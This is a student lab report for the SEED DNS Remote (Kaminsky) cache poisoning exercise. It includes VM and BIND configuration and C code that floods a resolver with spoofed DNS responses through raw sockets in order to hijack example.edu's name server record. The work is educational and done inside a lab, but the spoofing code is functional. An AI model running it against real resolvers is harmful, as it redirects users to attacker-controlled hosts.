---
title: "SEED LAB: DNS Remote Report"

date: "2021-11-04"

tags: ["seedlab", "lecture", "network", "security"]


links:
    website: 'https://seedsecuritylabs.org/Labs_16.04/Networking/DNS_Remote/'
    alias: DNS_Remote
---

[DNS_Remote Question File](https://seedsecuritylabs.org/Labs_16.04/Networking/DNS_Remote/)


## 0. Configure 

### 0.1 Configure Bash Prompty

In this report, we used three virtual machines and set the all in same NAT networks.
```Shell
# Commands for the victim 01
$ echo 'export PS1="[DNS]\[\e[1;31m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
# Commands for the victim 02
$ echo 'export PS1="[VTM]\[\e[1;34m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
# Commands for the attacker
$ echo 'export PS1="[ATC]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
```

We also used the commands above to configure their bash prompt, which can help us identify them more easily. As the image shows, we used the left as the DNS server and the right two as the attacker and the victim. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8e8f75a115f4a277b8c6e15d99da95ac.png"/>
<figcaption>Figure 0.1 "Bash Promp" for the three VMs</figcaption><br>
</figure>

### 0.2 Configure the Local DNS Server Apollo

In this part, we configured the VM "<ins style="color:blue;font-weight:bold">DNS</ins>", which provided the DNS service to the user in all tasks. Its IP address was `10.0.2.6`. 
Firstly, we modified the file, `/etc/bind/named.conf.options` to add the block below, in which we specified a new dump file to `/var/cache/bind/dump.db` and turned off DNSSEC protection and also fixed the source port number for DNS service always to `33333`. 

```js
options {
    dump-file "/var/cache/bind/dump.db";
    dnssec-enable no;
    query-source port 33333
};
```

After that, we executed the following three commands in the VM. The first and the second dump all DNS cache into `dump.db` file and clear the cache in the server, respectively. The third one restarted the Bind9 DNS service to activate all changes to the configuration file. 

<figure>
<img style="width:100%" src="/assets/images/16351739843977/16351776102245.jpg"/>
<figcaption>Figure 0.1 "Bash Promp" for the three VMs</figcaption><br>
</figure>

### 0.3 Configure User Machine

In this part, we configured the VM "<ins style="color:green;font-weight:bold">VTM</ins>", which is the user of the DNS service. Its IP address was `10.0.2.7`. 
First of all, we added a new line `nameserver 10.0.2.6` in the configuration file, `/etc/resolvconf/resolv.conf.d/head`, to enforce the VM use `10.0.2.6` as its DNS server, which was the IP address of "<ins style="color:blue;font-weight:bold">DNS</ins>". After that, we used the command `dig | grep SERVER` to verified whether the user will use the expect DNS server to resolve the url. The image below shows that the "<ins style="color:green;font-weight:bold">VTM</ins>" actually did that as expect. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_31b47aad52654dd8e0d11b8cb30c5ae7.png"/>
<figcaption>Figure 0.2 The output of `dig` command</figcaption><br>
</figure>

Besides, we verified the DNS packages by the WireShark on DNS server. As the image below shown, two DNS packages were transported between "<ins style="color:green;font-weight:bold">VTM</ins>" and <ins style="color:blue;font-weight:bold">DNS</ins>. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_2f2ad6cc8cc9f03cae89398e6c58eb8c.png"/>
<figcaption>Figure 0.3 Captured DNS packages </figcaption><br>
</figure>


## Task 1: Remote Cache Poisoning

### 1.1 SubTask: Spoofing DNS request

In this part, we implemented the DNS attack by a file, `part01.c` where we used the function `system` to invoke the `dig` to send query to the "<ins style="color:blue;font-weight:bold">DNS</ins>" ($10.0.2.6$). Specifically, we first defined a string to launch an request with fixed url `aaaaa.example.com`. In the next line, we set the char value in $23 + rand() \% 5$  to $'a' + rand()\%26;$. The $23$ is the index of the start of the url string, and $rand() \% 5$ means we random select one of the five 'a' in subdomain of the url. $'a' + rand()\%26;$ means a random letter from 'a' to 'z'.  Therefore, we randomly change a char in subdomain of the url. 

```c
/* part01.c */
#include <stdio.h>
#include <string.h>

int main(int argc, char * argv[]) {
    char cmd[] = "/usr/bin/dig @10.0.2.6 aaaaa.example.com"; 
    cmd[23 + rand()%5] = 'a' + rand()%26;
    int res = system(cmd); 
    return res;
}
```
The image below shows the package that we captured from the wireshark on "<ins style="color:blue;font-weight:bold">DNS</ins>". 

<figure>
<img style="width:100%" src="/assets/images/16351739843977/16355029302845.jpg"/>
<figcaption>Figure 1.1 Capture package after executing the command </figcaption><br>
</figure>

### 1.2 SubTask: Spoofing DNS Replies

#### 1.2.1 Observer the valid DNS request and response package

We used the Wireshark to first capture the request and response package for DNS protocol, which could be used as an example for us to construct the spoofing ones. 
We sent the request by command `dig @10.0.2.6 www.example.edu`. As the image below shows, there were four packages. The first one was the DNS request package from "<ins style="color:red;font-weight:bold">ATK</ins>" to "<ins style="color:blue;font-weight:bold">DNS</ins>". Because the url was constructed by us, and it is highly-possible that there was no cache for such a request. Therefore, "<ins style="color:blue;font-weight:bold">DNS</ins>" had to send a request to authority name server online to request ip of the url, which is the second package in the image. In the package 03, the online name server responded the request. Finally, the "<ins style="color:blue;font-weight:bold">DNS</ins>"cached the request and responded the request from "<ins style="color:red;font-weight:bold">ATK</ins>". 

<figure> 
<img style="width:100%" src="/assets/images/16351739843977/16356288578567.jpg"/>
<figcaption>Figure 1.2.1.1 All captured packages after request abcde.example.edu</figcaption><br>
</figure>

In there, we focused only on the first and the third package, because they are critical for our attack. Figure 1.2.1.2 below shows the details of the first package. In the dns header, we need to specify the *request id*(2 bytes), *flag* (0x8403) and *the number of each record* (2 bytes each). As to the dns payload, there are two records: a question record and an additional record. The later one is optional, so we should construct the question record also following the example which consist of *url address*(size depended by the url length), *type*(0x0001) and *class*(0x0001)

<figure> 
<img style="width:100%" src="/assets/images/16351739843977/16356288807677.jpg"/>
<figcaption>Figure 1.2.1.2 Details of the first package (DNS Request)</figcaption><br>
</figure>

Figure 1.2.1.3 below is the captured package for the package 3 from the remote name server. Compared with the first one, the *flag* was set to 0x0084, and two answer records occurred in the package. Even though, there was no authority record, we can still add it into the package so that we can poisoned caches on the  "<ins style="color:blue;font-weight:bold">DNS</ins>". 

<figure> 
<img style="width:100%" src="/assets/images/16351739843977/16356289439910.jpg"/>
<figcaption>Figure 1.2.1.3 Details of the third package (DNS response)</figcaption><br>
</figure>

#### 1.2.2 Implementation based on `udp.c` file

We modified the file `udp.c` to spoof DNS response, and we only made change to the main function there. Due to a number of lines, we describe the details of the changes in different sections below. 

The first one shows below, where we defined the ip of "<ins style="color:green;font-weight:bold">VTM</ins>", "<ins style="color:blue;font-weight:bold">DNS</ins>" and the DNS server of `example.edu`(ether "199.43.133.53" or "199.43.135.53"). After that, we also added the prefix *resp_* to the name of buffer, dns payload, ip and upd header. 

```c
    /* part02.c sections01*/
    char *vtm_ip = argv[1],  *sev_ip = argv[2];
    //An alternative one is "199.43.133.53"
    char *example_dns_ip = "199.43.135.53";  

    char resp_buffer[PCKT_LEN];
    memset(resp_buffer, 0, PCKT_LEN);
    // Our own headers' structures
    struct ipheader *resp_ip = (struct ipheader *) resp_buffer;
    struct udpheader *resp_udp = (struct udpheader *)(resp_buffer + sizeof(struct ipheader));
    struct dnsheader *resp_dns = (struct dnsheader *)(resp_buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    char *resp_data = (resp_buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
```

After that, we tried to construct the dns package with payload. There should be three fields. Specifically, we first set the flag and also specify the number of question, answer and authority records to 1. That of the additional records is set to 0. 

```c
    /* part02.c sections02*/
    /************ CONSTRUCT DNS PACKAGE ************/ 
    resp_dns -> flags = htons(FLAG_R);
    resp_dns -> QDCOUNT = htons(1);
    resp_dns -> ANCOUNT = htons(1);
    resp_dns -> NSCOUNT = htons(1);
    resp_dns -> ARCOUNT = htons(0);
```

And then, we constructed the three records based on the example before. We used the strcpy to set data like name. The data types short and int were used to set 2 bytes and 4 bytes data respectively. Besides, the functions `htons()` and `htonl()` were used to handle these digital values in a network package. 

```c
    /* part02.c sections03*/
    // 1. QUESTION RECORD
    // NAME(char*) | dataEnd(two short: 4bytes)
    char* qd_head = resp_data;
    int qd_len = 0; 
    // 1.1 NAME (char*)
    char* qd_name = qd_head;
    strcpy(qd_name, "\5aaaaa\7example\3edu");
    qd_len += (strlen(qd_name) + 1);
    // 1.2 dataEnd(two short int)
    struct dataEnd* qd_end = (struct dataEnd*) (qd_head+qd_len);
    qd_end->type = htons(1);
    qd_end->class = htons(1);
    qd_len += sizeof(struct dataEnd);
```

Compared with the previous one, the answer record contains more data fields, i.e. the 4 bytes TTL, 2 bytes data length, and 4 bytes ip address. A function `inet_addr` was used there for us to convert string into unsigned int. 

```c
    // 2. ANSWER RECORD
    // NAME(char*) | dataEnd(two short: 4bytes) | TTL(unsigned int: 4bytes) |
    // data length(short: 2bytes) | resp_ip(unsigned int: 4bytes)
    char* an_head = (resp_data + qd_len);
    int an_len = 0; 
    // 2.1 NAME(char*)
    char* an_name = an_head; 
    strcpy(an_name, "\5aaaaa\7example\3edu");
    an_len += (strlen(an_name) + 1);
    // 2.2 dataEnd(two short int)
    struct dataEnd* an_end = (struct dataEnd*) (an_head+an_len);
    an_end->type = htons(1);
    an_end->class = htons(1);
    an_len += sizeof(struct dataEnd);
    // 2.3 TTL(unsigned int: 4bytes)
    unsigned int* an_ttl = (unsigned int*) (an_head+an_len);
    *an_ttl = htonl(0x00002000); // Use htonl which is for 4bytes int
    an_len += sizeof(unsigned int);
    // 2.4 data length(unsigned short: 2bytes)
    unsigned short* an_data_len = (unsigned short*) (an_head+an_len);
    *an_data_len =  htons(0x0004);
    an_len += sizeof(unsigned short);
    // 2.5 resp_ip(unsigned int: 4bytes)
    unsigned int* an_resp_ip = (unsigned int*) (an_head+an_len);
    *an_resp_ip = inet_addr("1.2.3.4");
    an_len += sizeof(unsigned int);
```

In there, we built the authority record by the previous example captured by Wireshark. 

```c
    // 3. AUTHORITY RECORD
    // NAME(char*) | dataEnd(two short: 4bytes) | TTL(unsigned int: 4bytes) |
    // data length(short: 2bytes) | Data(char*)
    char* au_head = (an_head + an_len);
    int au_len = 0; 
    // 3.1 NAME(char*)
    char* au_name = au_head;
    strcpy(au_name, "\7example\3edu");
    au_len += (strlen(au_name) + 1);
    // 3.2 dataEnd(two short: 4bytes)
    struct dataEnd *au_end = (struct dataEnd*) (au_head+au_len);
    au_end->type = htons(0x0002); //NS Record
    au_end->class = htons(0x0001);
    au_len += sizeof(struct dataEnd);
    // 3.3 TTL(unsigned int: 4bytes)
    unsigned int *au_ttl = (unsigned int*) (au_head+au_len);
    *au_ttl = htonl(0x00002000); 
    au_len += sizeof(unsigned int);
    // 3.4 data length(short: 2bytes)
    unsigned short *au_data_len = (unsigned short*) (au_head+au_len);
    *au_data_len = htons(0x0017); // 0x0017 = 23: length of the url below
    au_len += sizeof(unsigned short);
    // 3.5 Data(char*)
    char* au_data = (au_head+au_len);
    strcpy(au_data, "\2ns\16dnslabattacker\3com");
    au_len += (strlen(au_data) + 1);
    unsigned short int resp_len = qd_len + an_len + au_len;
```

After that, we construct the header of udp and ip respectively. We did not actually made any changes in there except the name of ip and udp header. Because, we aimed to spoof package from the remote name server to our "<ins style="color:blue;font-weight:bold">DNS</ins>". We used the `33333` as dest port, which was used by the "<ins style="color:blue;font-weight:bold">DNS</ins>" enforcedly. We almost did not change codes in this codes section.

```c
    /************ CONSTRUCT UDP PACKAGE ************/ 
    resp_udp->udph_srcport = htons(53);
    resp_udp->udph_destport = htons(33333);
    resp_udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + resp_len);
    resp_udp->udph_chksum=check_udp_sum(resp_buffer, sizeof(struct udpheader) + sizeof(struct dnsheader) + resp_len);

    /************ CONSTRUCT IP PACKAGE ************/ 
    resp_ip -> iph_ihl = 5;
    resp_ip->iph_ver = 4;
    resp_ip->iph_tos = 0; 
    resp_ip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + resp_len);
    resp_ip->iph_ident=htons(rand());
    resp_ip->iph_ttl= 110;
    resp_ip->iph_protocol= 17;
    resp_ip->iph_sourceip = inet_addr(example_dns_ip);
    resp_ip->iph_destip = inet_addr(sev_ip);
    resp_ip->iph_chksum = csum((unsigned short *)resp_buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
```

Finally, we initialised the socket and sent the package. We set the sock address to use port number $33333$ but it is optional in this case. It is because we use the UDP with raw socket and the port number has already been defined in our package manually. 

```c
    /************ INITIALISE AND CONFIGURE SOCKET ************/ 
    struct sockaddr_in resp_sin;
    resp_sin.sin_family = AF_INET;
    resp_sin.sin_port = htons(33333);
    resp_sin.sin_addr.s_addr = inet_addr(sev_ip); 

    int one = 1;
    const int *val = &one;
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd<0) printf("socket error\n");

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0){
        printf("error\n");	
        exit(-1);
    }

    /************ SENT PACKAGE ************/ 
    int resp_rst = sendto(sd, resp_buffer, resp_ip_pkg_len, 0, (struct sockaddr *)&resp_sin, sizeof(resp_sin));
            if(resp_rst < 0)printf("packet send error %d which means %s\n",errno,strerror(errno));
    close(sd);
```

The image below shows the package we captured in Wireshark. We defined three records: one question, one answer and one authority. Our spoofing package aimed to make the "<ins style="color:blue;font-weight:bold">DNS</ins>" believe that the address of `aaaaa.example.edu` should be `1.2.3.4` and the name server should be `ns.dnslabattacker.com`. 

<figure>
<img style="width:100%" src="/assets/images/16351739843977/16356264191956.jpg"/>
<figcaption>Figure 1.2.2.1 Capture package after spoofing DNS Replies </figcaption><br>
</figure>

### 1.3 SubTask: Launch an attack 

In this part, we moved our implementation in previous subtask into the `udp.c` file. Therefore, there were both `buffer` and `resp_buffer` storing the dns request and the dns response package respectively. 
After that, we changed the codes about sending the package as below. We used similar codes before to change the request and response URL randomly. Because of the modification, we had to recalculate the UDP checksum(related to the UDP package data) but not the IP checksum (depended only on the header). 

Mostly-important codes below are related to the transaction id and the number of responses. We found that it is hard to successfully replace the cache if we made the number too small. It is because most of package arrives before the "<ins style="color:blue;font-weight:bold">DNS</ins>" sends request to remote name server. However, if the number is too larger, it will slow down the attack. Therefore, we use $1000$ in our implementation. As to the transaction id, we made it random at first and increased one in each response.

```c
while(1){	
    // Randomly change the request and response url
    int charnumber = 1+rand()%5;
    char rd_char = ('a' + rand()%26);
    *(data+charnumber) = rd_char;
    *(qd_name+charnumber) = rd_char; 
    *(an_name+charnumber) = rd_char;
        
    // recalculate the checksum for the UDP packet
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); 
    // send response the packet out
    if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *) &requ_sin, sizeof(requ_sin)) < 0)
        printf("packet send error %d which means %s\n", errno, strerror(errno));
        
    for(int i=0; i<1000; i++){
        resp_dns->query_id += 1; 
        resp_udp->udph_chksum=check_udp_sum(resp_buffer, resp_ip_pkg_len-sizeof(struct ipheader));
        int resp_rst = sendto(sd, resp_buffer, resp_ip_pkg_len, 0, (struct sockaddr *)&resp_sin, sizeof(resp_sin));
        if(resp_rst < 0)printf("packet send error %d which means %s\n",errno,strerror(errno));
    }
}
```

We used the following two commands to verify the result of our attack. The output below actually proves that the NS record for `example.edu` becomes `ns.dnslabattacker.net`. 

<figure>
<img style="width:100%" src="/assets/images/16351739843977/16356208433384.jpg"/>
<figcaption>Figure 1.3.1 The changed record in the Cache file </figcaption><br>
</figure>

## Task 2: Remote Cache Poisoning

### 2.1 Why additional record will not be accepted by Apollo? 

It is because the attack may use the data to replace the IP address of a specific website. If the attacker spoofs a response for a request to the un-exist subdomain Facebook, the attacker can replace the IP of `www.facebook.com` with a malicious website. After that, all requests about the URL to the DNS server will be directed to the malicious website managed by the attacker. 
However, if we ignore the additional record, even when the authority name server was changed, the IP of `www.facebook.com` would not be influenced until the current cache is discarded. 


### 2.2 Use A Fake Domain Name
We followed their instructions in there, to configure both of the "<ins style="color:red;font-weight:bold">ATK</ins>" and  "<ins style="color:blue;font-weight:bold">DNS</ins>". 

Specifically, as to the "<ins style="color:blue;font-weight:bold">DNS</ins>", we modified `/etc/bind/named.conf.default-zones` file to add the lines below: 
```js
zone "ns.dnslabattacker.net" { 
    type master; 
    file "/etc/bind/db.attacker"; 
};
```
After that, we created a file `/etc/bind/db.attacker`, and executed the `sudo chmod 644 /etc/bind/db.attacker`. The content of the file is shown below
```
$TTL 604800
@       IN      SOA   localhost. root.localhost. (
                2
                604800
                86400
                2419200
                604800)
@       IN      NS    ns.dnslabattacker.net.
@       IN      A     10.0.2.15
@       IN      AAAA  ::1
```

as to the "<ins style="color:red;font-weight:bold">ATK</ins>", we did the similar configuration. We first edited the file `/etc/bind/named.conf.local`to add the line below: 
```js
zone "example.edu" { 
    type master; 
    file "/etc/bind/example.com.db"; 
};
```

Again we created the file `/etc/bind/example.com.db` and executed `sudo chmod 644 /etc/bind/example.com.db`. The content of the file is shown below
```
$TTL 3D
@ IN SOA ns.example.edu. admin.example.edu. (
 2008111001
 8H
 2H
 4W
 1D)
@ IN NS ns.dnslabattacker.net.
@ IN MX 10 mail.example.edu.
www IN A 1.1.1.1
mail IN A 1.1.1.2
* .example.edu IN A 1.1.1.100
```

The image below shows the output after we query the `www.example.edu`. 

<figure>
<img style="width:100%" src="/assets/images/16351739843977/16356444377688.jpg"/>
<figcaption>Figure 1.3.1 The changed record in the Cache file </figcaption><br>
</figure>
